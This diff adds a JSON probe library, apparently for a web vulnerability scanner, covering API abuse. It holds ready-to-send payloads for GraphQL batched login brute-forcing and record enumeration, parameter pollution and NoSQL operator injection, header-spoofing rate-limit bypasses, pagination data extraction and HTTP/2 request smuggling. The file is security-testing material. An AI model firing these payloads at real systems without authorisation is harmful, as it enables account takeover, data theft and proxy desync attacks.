@@ -1,0 +1,273 @@
+{
+  "category": "api_abuse",
+  "contexts": {
+    "graphql_batching": {
+      "description": "GraphQL batch query abuse — send arrays of queries in a single request to bypass rate limiting, brute-force OTPs, or enumerate data without triggering per-request throttles",
+      "tech_match": ["GraphQL", "Apollo", "Hasura", "Relay"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "[{\"query\":\"{ __typename }\"},{\"query\":\"{ __typename }\"},{\"query\":\"{ __typename }\"},{\"query\":\"{ __typename }\"},{\"query\":\"{ __typename }\"}]",
+          "description": "Send 5 batched queries — if all return results, batch queries are accepted and rate limits can be bypassed by packing N operations into 1 HTTP request",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["__typename"]},
+            {"type": "not_word", "words": ["batching is not allowed", "batch limit", "too many operations"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        },
+        {
+          "payload": "[{\"query\":\"mutation { login(username:\\\"admin\\\",password:\\\"test1\\\") { token } }\"},{\"query\":\"mutation { login(username:\\\"admin\\\",password:\\\"test2\\\") { token } }\"},{\"query\":\"mutation { login(username:\\\"admin\\\",password:\\\"test3\\\") { token } }\"}]",
+          "description": "Batched login mutations — 3 credential attempts in a single request bypassing per-request rate limiting on authentication",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["rate limit", "too many", "batch", "blocked"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{\"query\":\"query { alias1: user(id:1){email} alias2: user(id:2){email} alias3: user(id:3){email} alias4: user(id:4){email} alias5: user(id:5){email} }\"}",
+          "description": "Query aliasing to enumerate records in a single request — bypasses rate limits that count HTTP requests but not query complexity",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "words": ["email"]},
+            {"type": "not_word", "words": ["complexity limit", "depth limit", "too many aliases"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "rest_parameter_pollution": {
+      "description": "REST parameter pollution — duplicate parameters, array wrapping, and type juggling to bypass validation or cause unexpected behavior in backend parameter parsing",
+      "tech_match": [],
+      "param_match": ["id", "user_id", "email", "role", "status", "amount", "price"],
+      "probes": [
+        {
+          "payload": "id=1&id=2",
+          "description": "Duplicate parameter — PHP uses last value, ASP.NET joins with comma, Java uses first. Auth middleware may check one occurrence while business logic uses another",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "{\"id\":[1,2,3]}",
+          "description": "Array wrapping — send parameter as JSON array instead of scalar. Backend may iterate and process all values, bypassing single-value validation",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["invalid type", "must be", "expected string", "expected number"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        },
+        {
+          "payload": "{\"id\":true}",
+          "description": "Type juggling — send boolean true instead of integer/string. Weakly-typed backends may coerce true to 1, bypassing string-based validation",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["invalid", "type error", "bad request"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30
+        },
+        {
+          "payload": "{\"id\":{\"$gt\":\"\"}}",
+          "description": "NoSQL operator injection via JSON object — MongoDB accepts query operators in JSON; $gt with empty string matches all documents",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{\"id\":\"1\\u00002\"}",
+          "description": "Null byte injection in JSON string — may truncate value at null byte in C-based parsers while JSON parser accepts full string",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30
+        }
+      ]
+    },
+    "api_rate_limit_bypass": {
+      "description": "Rate limit bypass via header spoofing, IP rotation indicators, and origin obfuscation — test whether rate limits are tied to easily-spoofable identifiers",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "X-Forwarded-For: 127.0.0.1 — rate limit may key on this header instead of real client IP",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["rate limit", "too many requests", "429"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35,
+          "variables": {"header": "X-Forwarded-For: 127.0.0.1"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "X-Real-IP: 10.0.0.1 — alternative IP header that some rate limiters trust for client identification",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["rate limit", "too many requests", "429"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {"header": "X-Real-IP: 10.0.0.1"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "X-Originating-IP: 192.168.1.1 — less common IP override header, some WAFs and load balancers honor it",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["rate limit", "too many requests"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 25,
+          "variables": {"header": "X-Originating-IP: 192.168.1.1"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "X-Client-IP with rotating value — if rate limit resets with different header value, limit is header-keyed",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["rate limit", "too many requests", "429"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {"header": "X-Client-IP: 172.16.0.1"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "Case variation in path — /api/Login vs /api/login may have separate rate limit buckets",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["not found", "404"]}
+          ],
+          "severity": "low",
+          "confidence_boost": 20,
+          "variables": {"path_case_toggle": true}
+        }
+      ]
+    },
+    "broken_pagination": {
+      "description": "Pagination abuse — negative offsets, extreme limits, cursor manipulation to extract unauthorized data or cause DoS",
+      "tech_match": [],
+      "param_match": ["page", "offset", "limit", "per_page", "page_size", "cursor", "skip", "take", "count"],
+      "probes": [
+        {
+          "payload": "-1",
+          "description": "Negative offset/page — may wrap to end of dataset, expose records from the tail, or cause integer underflow",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 100},
+            {"type": "not_word", "words": ["invalid", "must be positive", "error"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {"target_param": "offset"}
+        },
+        {
+          "payload": "999999",
+          "description": "Extreme limit value — API may return entire dataset if max limit is not enforced server-side",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 5000},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35,
+          "variables": {"target_param": "limit"}
+        },
+        {
+          "payload": "0",
+          "description": "Zero limit — some ORMs treat limit=0 as no limit, returning all records",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 2000},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {"target_param": "limit"}
+        },
+        {
+          "payload": "AAAA",
+          "description": "Non-numeric cursor manipulation — inject invalid cursor to trigger error messages revealing pagination implementation (Relay, Keyset, etc.)",
+          "matchers": [
+            {"type": "status", "status": [400, 500]},
+            {"type": "word", "words": ["cursor", "decode", "base64", "invalid", "pagination"]}
+          ],
+          "severity": "low",
+          "confidence_boost": 20,
+          "variables": {"target_param": "cursor"}
+        },
+        {
+          "payload": "eyJpZCI6MX0=",
+          "description": "Base64-encoded cursor injection {\"id\":1} — if cursor is a base64 JSON object, manipulating the ID may access arbitrary pages/records",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35,
+          "variables": {"target_param": "cursor"}
+        }
+      ]
+    },
+    "http2_smuggling": {
+      "description": "HTTP/2 request smuggling — H2.CL and H2.TE desync attacks exploiting HTTP/2 to HTTP/1.1 downgrade in reverse proxies",
+      "tech_match": ["Nginx", "Apache", "HAProxy", "AWS ALB", "Cloudflare"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "POST / HTTP/2\r\nHost: {{host}}\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n",
+          "description": "H2.CL probe — HTTP/2 front-end strips Transfer-Encoding but passes Content-Length; backend receives both headers after H2-to-H1 translation causing desync",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 500]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "POST / HTTP/2\r\nHost: {{host}}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
+          "description": "H2.TE detection — front-end uses content-length from H2 frame, backend parses chunked encoding in downgraded H1 request. Timeout indicates desync.",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 403, 500]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "POST / HTTP/2\r\nHost: {{host}}\r\ntransfer-encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG",
+          "description": "H2 header case smuggling — HTTP/2 requires lowercase headers; proxy may pass mixed-case to H1 backend where Transfer-Encoding is case-insensitive, causing differential parsing",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 500]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "POST / HTTP/2\r\nHost: {{host}}\r\nContent-Length: 3\r\nTransfer-Encoding:\x00chunked\r\n\r\n0\r\n\r\n",
+          "description": "H2 TE with null byte — HTTP/2 binary framing allows null bytes in header values; H1 backend may truncate at null or parse differently causing desync",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 500]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    }
+  }
+}
